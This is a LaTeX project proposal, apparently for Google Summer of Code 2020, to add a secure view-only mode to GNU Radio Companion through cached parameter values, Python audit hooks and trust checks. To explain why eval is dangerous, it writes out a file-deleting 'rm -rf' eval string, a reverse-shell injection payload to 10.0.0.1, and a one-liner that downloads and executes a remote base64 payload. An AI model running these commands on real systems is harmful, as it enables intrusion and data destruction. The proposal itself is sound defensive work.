@@ -1,0 +1,423 @@
+\documentclass[a4paper]{article}
+
+\usepackage[english]{babel}
+\usepackage[utf8]{inputenc}
+\usepackage{amsmath}
+\usepackage{graphicx}
+\usepackage[colorinlistoftodos]{todonotes}
+\usepackage{listings}
+\usepackage{caption}
+\usepackage{color}
+\usepackage{textcomp}
+\usepackage{xcolor}
+\usepackage[T1]{fontenc}
+\usepackage{charter}
+\usepackage{environ}
+\usepackage{tikz}
+\usepackage[hidelinks]{hyperref}
+
+\renewcommand\familydefault{\sfdefault}
+\usetikzlibrary{calc,matrix}
+
+\hypersetup{
+    colorlinks,
+    linkcolor={red!50!black},
+    citecolor={blue!50!black},
+    urlcolor={blue!80!black}
+}
+
+\makeatletter% Set up caption and labels for lstlistings
+\DeclareCaptionFont{white}{\color{white}}
+\DeclareCaptionFormat{listing}{\colorbox{greatblue}{\parbox{\textwidth}{\hspace{1cm}#1#2#3}}}
+\captionsetup[lstlisting]{format=listing,labelfont=white,textfont=white}
+\let\matamp=&
+\catcode`\&=13
+\makeatletter
+\def&{\iftikz@is@matrix
+  \pgfmatrixnextcell
+  \else
+  \matamp
+  \fi}
+\makeatother
+
+\newcounter{lines}
+\def\endlr{\stepcounter{lines}\\}
+
+\newcounter{vtml}
+\setcounter{vtml}{0}
+
+\newif\ifvtimelinetitle
+\newif\ifvtimebottomline
+\tikzset{description/.style={
+  column 2/.append style={#1}
+ },
+ timeline color/.store in=\vtmlcolor,
+ timeline color=red!80!black,
+ timeline color st/.style={fill=\vtmlcolor,draw=\vtmlcolor},
+ use timeline header/.is if=vtimelinetitle,
+ use timeline header=false,
+ add bottom line/.is if=vtimebottomline,
+ add bottom line=false,
+ timeline title/.store in=\vtimelinetitle,
+ timeline title={},
+ line offset/.store in=\lineoffset,
+ line offset=4pt,
+}
+
+\NewEnviron{vtimeline}[1][]{%
+\setcounter{lines}{1}%
+\stepcounter{vtml}%
+\begin{tikzpicture}[column 1/.style={anchor=east},
+ column 2/.style={anchor=west},
+ text depth=0pt,text height=1ex,
+ row sep=1ex,
+ column sep=1em,
+ #1
+]
+\matrix(vtimeline\thevtml)[matrix of nodes]{\BODY};
+\pgfmathtruncatemacro\endmtx{\thelines-1}
+\path[timeline color st] 
+($(vtimeline\thevtml-1-1.north east)!0.5!(vtimeline\thevtml-1-2.north west)$)--
+($(vtimeline\thevtml-\endmtx-1.south east)!0.5!(vtimeline\thevtml-\endmtx-2.south west)$);
+\foreach \x in {1,...,\endmtx}{
+ \node[circle,timeline color st, inner sep=0.15pt, draw=white, thick] 
+ (vtimeline\thevtml-c-\x) at 
+ ($(vtimeline\thevtml-\x-1.east)!0.5!(vtimeline\thevtml-\x-2.west)$){};
+ \draw[timeline color st](vtimeline\thevtml-c-\x.west)--++(-3pt,0);
+ }
+ \ifvtimelinetitle%
+  \draw[timeline color st]([yshift=\lineoffset]vtimeline\thevtml.north west)--
+  ([yshift=\lineoffset]vtimeline\thevtml.north east);
+  \node[anchor=west,yshift=16pt,font=\large]
+   at (vtimeline\thevtml-1-1.north west) 
+   {\text{\vtimelinetitle}};
+ \else%
+  \relax%
+ \fi%
+ \ifvtimebottomline%
+   \draw[timeline color st]([yshift=-\lineoffset]vtimeline\thevtml.south west)--
+  ([yshift=-\lineoffset]vtimeline\thevtml.south east);
+ \else%
+   \relax%
+ \fi%
+\end{tikzpicture}
+}
+
+\colorlet{punct}{red!60!black}
+\definecolor{background}{HTML}{EEEEEE}
+\definecolor{delim}{RGB}{20,105,176}
+\definecolor{dkgreen}{rgb}{0,0.6,0}
+\definecolor{gray}{rgb}{0.5,0.5,0.5}
+\definecolor{mauve}{rgb}{0.58,0,0.82}
+\definecolor{greatblue}{RGB}{91,155,215} 
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+\colorlet{numb}{magenta!60!black}
+
+\lstdefinelanguage{json}{
+    basicstyle=\normalfont\ttfamily,
+    numbers=left,
+    numberstyle=\scriptsize,
+    stepnumber=1,
+    numbersep=8pt,
+    showstringspaces=false,
+    breaklines=true,
+    backgroundcolor=\color{backcolour},
+    literate=
+     *{0}{{{\color{numb}0}}}{1}
+      {1}{{{\color{numb}1}}}{1}
+      {2}{{{\color{numb}2}}}{1}
+      {3}{{{\color{numb}3}}}{1}
+      {4}{{{\color{numb}4}}}{1}
+      {5}{{{\color{numb}5}}}{1}
+      {6}{{{\color{numb}6}}}{1}
+      {7}{{{\color{numb}7}}}{1}
+      {8}{{{\color{numb}8}}}{1}
+      {9}{{{\color{numb}9}}}{1}
+      {:}{{{\color{punct}{:}}}}{1}
+      {,}{{{\color{punct}{,}}}}{1}
+      {\{}{{{\color{delim}{\{}}}}{1}
+      {\}}{{{\color{delim}{\}}}}}{1}
+      {[}{{{\color{delim}{[}}}}{1}
+      {]}{{{\color{delim}{]}}}}{1},
+}
+
+\lstset{
+  language=Python,
+  aboveskip=3mm,
+  belowskip=3mm,
+  showstringspaces=false,
+  columns=flexible,
+  basicstyle={\small\ttfamily},
+  numbers=left,
+  numberstyle=\tiny\color{gray},
+  keywordstyle=\color{blue},
+  commentstyle=\color{dkgreen},
+  stringstyle=\color{mauve},
+  backgroundcolor=\color{backcolour},
+  upquote=true,
+  breaklines=true,
+  breakatwhitespace=true,
+  tabsize=4
+}
+
+\title{%
+  Google Summer of Code 2020
+    \\ ~\\
+    \large GRC: View Only Mode (Secure)
+    }
+
+\author{Arpit Gupta}
+
+\date{\today}
+
+\begin{document}
+\maketitle
+\section{Introduction}
+\label{sec:introduction}
+GNU Radio consists of a very important component which is called the GNU Radio Companion or the GRC. The GNU Radio Companion is a graphical UI used to develop GNU Radio applications, for creating signal flow graphs and generating flow-graph source code. It is under a lot of constant development. GRC still consists of some particularly important security vulnerabilities that needs to resolved.
+\\ \\
+When a flowgraph from an untrusted source is opened in GRC, arbitrary Python code can be executed. This poses a potential security risk. For example, Python Module Block allows you to run arbitrary python code in the GNU Radio Companion and untrusted python code can be very damaging for your operating system which will be discussed further below. So, it is important to come with a solution that prevents this without interfering with the normal working of the GRC.
+\\ \\
+The security problem we need to solve is that no code should execute just because a user has opened a flowgraph that they did not write. Like any other program, once a user decides to execute the flowgraph code in the GRC, it is considered trusted, and should be allowed to do anything. Storing all the evaluated values of all parameters within a flow graph (.grc) file would allow us to open such flow graphs without compromising security. No code would be have to executed to draw the flow graph and block parameters can be viewed safely. Only if the flow graph is modified the user would have to choose to trust the flow graph thus enabling normal eval operations.
+\\ \\
+
+\subsection{Primary features of the project}
+\begin{enumerate}
+\item Implementation of persistent cache (in JSON format) to store the evaluated parameters in the same .grc file.
+\item Make use of the audit API in newer python version to warn/confirm file/network operations.
+\item Add some UID to flowgraph files, so that the view-only mode can be auto-enabled/disabled.
+\item Limit the eval time (Future Prospect).
+\end{enumerate}
+
+\section{Proposed Workflow}
+\label{sec:theory}
+Initially, I will be doing the groundwork by setting up the implementation of the storing the evaluated parameters in the grc file. I will be implementing a persistent cache that enable us to store the evaluated parameters in the same grc file along with normal variables. Then I will use the audit API in python to detect, identify and analyze the misuse of Python.
+
+\subsection{Implementation of the persistent cache}
+Persistent cache means information is stored in "permanent" memory, so data is not lost after a system restart or system crash as it would be if it is stored in cache memory. We need to implement a persistent cache that would enable us to store the normal eval operations at a time and thus would allow us to view a flowgraph without executing any python code.
+\\
+The persistent cache in the grc files would be in the form of JSON format, which would enable us to get all the evaluated parameters quite easily.
+\subsubsection{Implementation of the persistent cache}
+As we know that malicious code can be run inside a grc file when edited or when you execute the generated python or C++, it is required to store all the eval results generated from the grc file into a persistent cache to view the flowgraph generated from that file.
+\\
+Persistent cache would be JSON as it's value. Proposed cache is as follows:
+(Terminology for keys almost same as in grc files)
+\begin{lstlisting}[language=json,firstnumber=1]
+{
+    "persistent_cache": {
+        "metadata": {
+            "user_hash": "394236232667134094259032127083",
+            "content_hash": "787705264478809327430091530147"
+        },
+        "calculated_evals": {
+            "parameters": [
+                    "header block",
+                    "Not titled yet",
+                    "python",
+                    "[GRC Hier Blocks]",
+                ],
+            "blocks": {
+                "block_1": [
+                    "analog_sig_source_x_0",
+                    "complex",
+                    "samp_rate",
+                    "analog.GR_COS_WAVE",
+                    1000,
+                ],
+                "block_2": [
+                    "blocks_null_sink_0",
+                    "complex",
+                    "[[0,],]",
+                ],
+            }
+        }
+    }
+}
+\end{lstlisting}
+The keys \texttt{user\_hash} and \texttt{content\_hash} will be discussed in section 2.4
+
+\subsection{Why is \texttt{eval} dangerous?}
+Certain Python functions should not be used or should be used only with caution. Python’s documentation typically includes a note about the dangers. 
+\\
+Why do we require to add persistent cache to the eval functions?
+\\
+\texttt{eval()} take strings and turn them into executable code. They can be useful, especially if you are the one who controls the input. Suppose you’re evaluating a string that looks like this:
+\\
+"eval("\_\_import\_\_('os').system('rm -rf')", {})". It could erase all your files.
+\\
+Since eval() can be used to execute arbitrary code on the system, it should never ever ever be used on any type of unsanitized user input.
+\\
+Example in case of user input is:
+\\
+\begin{lstlisting}
+def addition(a, b):
+    return eval("%s + %s" % (a, b))
+
+
+result = addition(request.json['a'], request.json['b'])
+print("The result is %d." % result)
+\end{lstlisting}
+When the above code is provided with an input as shown:
+\begin{lstlisting}
+{"a":"__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')#", "b":"2"}
+\end{lstlisting}
+This would cause the application to call os.system() and spawn a reverse shell back to the IP 10.0.0.1 on port 8080.
+
+\subsection{Use of the Audit API in python to warn/confirm network operations}
+Python provides access to a wide range of low-level functionality on many common operating systems. While this is incredibly useful for "write-once, run-anywhere" scripting, it also makes monitoring of software written in Python difficult. Because Python uses native system APIs directly, existing monitoring tools either suffer from limited context or auditing bypass.
+\\
+Auditing bypass can occur when the typical system tool used for an action would ordinarily report its use, but accessing the APIs via Python do not trigger this. For example, invoking "curl" to make HTTP requests may be specifically monitored in an audited system, but Python's "urlretrieve" function is not.
+\begin{lstlisting}
+python -c "import urllib.request, base64;
+    exec(base64.b64decode(
+        urllib.request.urlopen('http://my-exploit/py.b64')
+    ).decode())"
+\end{lstlisting}
+This command currently bypasses most anti-malware scanners that rely on recognizable code being read through a network connection or being written to disk. It also bypasses protections such as file access control lists or permissions (no file access occurs), approved application lists (assuming Python has been approved for other uses), and automated auditing or logging (assuming Python is allowed to access the internet or access another machine on the local network from which to obtain its payload).
+\\
+To overcome this we need to create an audit API to monitor/warn such operations on runtime, which would allow us to stop such functions from being executed. Python 3.8+ provides us with a solution. So, even after the \texttt{eval} operations are called, we can monitor if any network calls using audit hooks. The implementation is as shown:
+\begin{lstlisting}
+import sys
+import stats
+
+suspicious_modules = ['socket']
+
+
+def audit_hook(event, args):
+    if event in ['urllib.Request', 'make_request']:
+        print(f"Network {event=} {args=}")
+    elif event in ['import'] and args[0] in suspicious_modules:
+        print(f"Suspicious import action {event=} module={args[0]}")
+
+sys.addaudithook(audit_hook)
+\end{lstlisting}
+This would print out any system or network calls which otherwise would be difficult to catch.
+
+\subsection{Identifying the foreign grc files}
+We have discussed almost all the possible scenarios to tackle with foreign grc files, but we still need to figure out which of the files are to be shown view only in the GNU Radio Companion and which of them can be directly edited.
+\\
+One way can be to initially consider all the grc files to be view only when initially open in the GRC, and then ask for user for permission whether to trust the file or not. But that would be really become frustrating for a user to always trust a flowgraph before the user can proceed.
+\\
+The two proposed ways follow the same principle used by the jupyter notebook which successfully ensures which of the .ipynb files to trust and which not to.
+\subsubsection{Two ways to check for untrusted grc files}
+\begin{itemize}
+    \item This could be done with some uid for each trusted flowgraph file. for example, you store a list of filepath to trusted flowgraphs along with a hash of their content. If a flow-graph is opened that is on that list and has a matching content hash, no view-only mode is used. If a flowgraph is trusted by the user, the hash of the content would then be stored, which would enable the GNU Radio companion to trust the grc file.
+    
+    \item When a flowgraph is opened by a user, the server computes a signature with the user’s key, and compares it with the signature stored in the grc file. If the signature matches, normal operations can be performed, otherwise the file can be seen in view only mode unless trusted.
+\end{itemize}
+A grc file on disk is either trusted or not in its entirety.
+\\ \\
+We could also explicitly trust the grc file which could done with a command-line such as:
+\\
+\texttt{gnuradio-companion trust /path/to/flowgraph\_file.grc}
+
+
+\section{Timeline}
+I will utilize the period of community bonding to familiarize myself with the GNU Radio community. I will also make sure to gain a deeper insight into the source code. This will enable me to contribute more efficiently to the community. Moreover, I will figure out ways to implement the persistent cache in the most possible efficient way by using efficient python libraries for my purpose, squashing all (if not most) the bugs before completion. Additionally, I will define the minute details of the project so that I face minimal difficulty in the coding period.
+\\ \\
+The necessary documentation will be done in parallel with the development. There is a 13-week long coding period. I have my holidays in the months of May, June, and July, so I’ll work full time during this period, i.e., around 35-40 hours a week while in August I’ll work for around 30-35 hours a week. I have made my deliverables accordingly on a weekly basis.
+\\ \\
+The expected timeline for my project is given below:
+\\ \\
+
+\begin{vtimeline}[description={text width=10cm}, 
+ row sep=6ex, 
+ use timeline header,
+ timeline title={Timeline of the project}]
+April 27 - May 18 & Define the minute details of the project along with the community bonding period.\endlr
+May 18 - May 25 & Go through the GRC project, understand the use of the eval functions.\endlr
+May 25 - June 1 & Initialize the implementation of persistent cache in the grc file, abstract its implementation, define all the helper functions required.\endlr
+June 1 - June 8 & Integrate the use of the persistent cache with the eval operations.\endlr
+June 8 - June 15 & Integrate the use of the persistent cache with the eval operations.\endlr
+June 15 - June 22 & Submit the code for Phase 1 evaluation and almost finish with the implementation of the cache. \endlr
+June 22 - June 29 & Design and implement a view only mode to safely view the block parameters.  \endlr
+June 29 - July 6 & Understand the requirement to add audit hooks for various evals and start implementing them.  \endlr
+July 6 - July 13 & Complete the addition of audit API, add logging to unauthorized network calls in eval. \endlr
+July 13 - July 20 & Submit the code for Phase 2 evaluation and implement a solution to identify foreign flowgraphs. \endlr
+July 20 - July 27 & Start working on the identification of foreign flowgraph file part. \endlr
+July 27 - Aug 3 & Ensure a smooth working of the complete project, proper functioning of enabling/disabling view only GRC mode.\endlr
+Aug 3 - Aug 10 & Thoroughly test the view only mode, buffer time for completing the remaining tasks and start working on the extended part (or if found out later). \endlr
+Aug 10 - Aug 17 & Complete the project and submit the final report. \endlr
+\end{vtimeline}
+\pagebreak
+
+\section{Deliverables of GSoC 2020}
+The deliverables of the GSoC project are as follows:
+\begin{itemize}
+\item Implement the persistent cache to store all the eval operations.
+\item Design and implement a view only grc mode to safely view flowgraphs.
+\item Add audit API to monitor any unknown network or os operations, also add a way to identify the foriegn grc files.
+\item Implement the complete project with thorough testing.
+\end{itemize}
+
+\subsection{Milestones}
+\begin{itemize}
+\item Phase-1: Implement  the persistent cache, along with integrating it with the eval operations.
+\item Phase-2: Design a complete view only mode for the block parameters, implement it, add audit hooks to listen for various network or os operations.
+\item Final Evaluation: Completion of the view only mode, add a way to identify foreign grc files from the trusted ones, thoroughly test the project too.
+\end{itemize}
+
+\subsection{Review/Merge Cycle}
+The code can be reviewed as per the proposed timeline whereas it can be merged according to the timeline stated below:
+\begin{itemize}
+\item June 15: Merge code for persistent cache.
+\item July 13: Merge code for the view only for grc files integrated completely with eval functions in the GNU Radio Companion.
+\item August 10: Merge the entire project along with the audit hooks and extended work (if possible).
+\end{itemize}
+
+\subsection{Testing}
+The code will be thoroughly tested locally at almost every step of the whole architecture, test scripts will also be written to ensure all the third-party packages are correctly installed. The code will also be compatible with standard pylint rules.
+
+\section{Acknowledgment}
+I have thoroughly gone through the GSoC StudentInfo page and GSoC Manifest page. I hereby assure that I will abide by the rules and regulations. I also accept the three strikes rule and the details mentioned.
+\\
+I also assure that I will communicate with the assigned mentor regularly, maintain thorough transparency and keep my work up to date.
+
+\section{License}
+The entire code during the coding period will be transparent, i.e., available on GitHub. The code submitted will be GPLv3 licensed.
+
+\section{Personal Details and Experience}
+I am a third year undergraduate at Indian Institute of Technology Roorkee. My areas of interest are software development, competitive programming, and deep learning. I am proficient in Django, Python, C++, Java, JavaScript, and PHP. I am familiar with git environment as I work regularly on GitHub. I haven't contributed much to open source till now, but I'll really like to contribute to GNU Radio and make it as my first remarkable experience. I will not get any extra credits for the GSoC project. I am proficient in two human languages including English.
+\\
+I have the experience of working closely with a team as I am an active member of \href{http://img.channeli.in/}{\textbf{Information Management Group}} at IIT Roorkee, a bunch of passionate enthusiasts who manage the \href{https://www.iitr.ac.in/}{\textbf{institute main website}}, internet and intranet activities of the university and the placement portal. My major project as a part of the group is Placement and Internship online, an application that digitizes the entire placement process from creating the official IIT Roorkee resume to knowing the results. The project has been implemented on Django, Django-Rest (python based framework). I have also worked on Lectures and Tutorials Portal (Lectut), an intranet-based study portal, used by unique 4k campus students and faculty every month with an aim of assisting them to achieve their academic goal, also implemented on Django, Django-Rest.
+\\
+\texttt{\textbf{Cyberspectrum is the best spectrum}}.
+\\ \\
+I started off with GNU Radio in January 2019. I successfully participated in GSoC'19 with GNU Radio, building a Block Header Parsing Tool. More details regarding my project can be found \href{https://headerparser.wordpress.com/}{here}. The complete code can be found \href{https://github.com/gnuradio/gnuradio/pull/2750}{here}.
+\\
+I have also made the following contributions to the code base:
+\begin{enumerate}
+\item Pull request \href{https://github.com/gnuradio/gnuradio/pull/2339}{\#2339}: gr\_modtool: remove unused code in rename.py
+\item Pull request \href{https://github.com/gnuradio/gnuradio/pull/2338}{\#2338}: Update README.md to provide instructions for building GR with support of python3.x
+\item Pull request \href{https://github.com/gnuradio/gnuradio/pull/2350}{\#2350}: grc: fix for GRC's block hotkeys
+\item Pull request \href{https://github.com/gnuradio/gnuradio/pull/2352}{\#2352}: grc: parse prefix for numeric values
+\item Pull request \href{https://github.com/gnuradio/gnuradio/pull/2373}{\#2373}: grc: Fix save as for existing grc file
+\item Pull request \href{https://github.com/gnuradio/gnuradio/pull/2330}{\#2330}: Add C++ generation support to gr-digital
+\item Pull request \href{https://github.com/gnuradio/gnuradio/pull/2343}{\#2343}: Add C++ generation support to gr-filter
+\item Pull request \href{https://github.com/gnuradio/gnuradio/pull/2361}{\#2361}: gr\_modtool: Fix for parameter wrap in cli inputs
+\item Pull request \href{https://github.com/gnuradio/gnuradio/pull/2398}{\#2398}: grc: Fix color for input boxes in parameter widget according to dark-gtk themes
+\item Pull request \href{https://github.com/gnuradio/gnuradio/pull/2412}{\#2412}: GRC: Fix for GRC crash in case of flowgraph error
+\item Pull request \href{https://github.com/gnuradio/gnuradio/pull/2418}{\#2418}: gr\_modtool: fix for .yml file make template
+\item Pull request \href{https://github.com/gnuradio/gnuradio/pull/2423}{\#2423}: gr\_modtool: fix for yaml generator
+\item Pull request \href{https://github.com/gnuradio/gnuradio/pull/2431}{\#2431}: modtool: fix modtool tests for missing pylint dependency
+\end{enumerate}
+\\
+I will always be available on email or Google Hangouts for any kind of discussion or query.
+\\
+I am highly interested to contribute to GNU Radio after the GSoC period. After the period, I'll mainly focus on extending the utility of this tool to different types of files, with the tool deciding how to manage each data file type by its own. I'll always be available for fixing the bugs that come up in the block header file tool. 
+\\ \\
+Here is the \href{https://aru31.github.io/resume.pdf}{link} to my CV.
+\\
+\subsection{Other Details}
+\begin{tabular}{ l l l }
+ Address & : & Roorkee, Uttarakhand, India \\
+ Email & : & \href{mailto:guptarpit1997@gmail.com}{guptarpit1997@gmail.com}  \\  
+ Github & : & \href{https://github.com/aru31/}{https://github.com/aru31/} \\
+ LinkedIn & : & \href{https://www.linkedin.com/in/aru31/}{https://www.linkedin.com/in/aru31/} \\
+ Codechef & : & \href{https://www.codechef.com/users/aru31121997}{ https://www.codechef.com/users/aru31121997} \\
+\end{tabular}
+
+\section{Conclusion}
+The view only mode will be a great addition to the GNU Radio. Keeping in mind the importance of the GRC, it would remove a very dangerous security vulnerability from the GNU Radio Companion. Since foreign grc files are used a lot to view anyone's flowgraphs, this project certainly holds a great value. 
+
+\end{document}
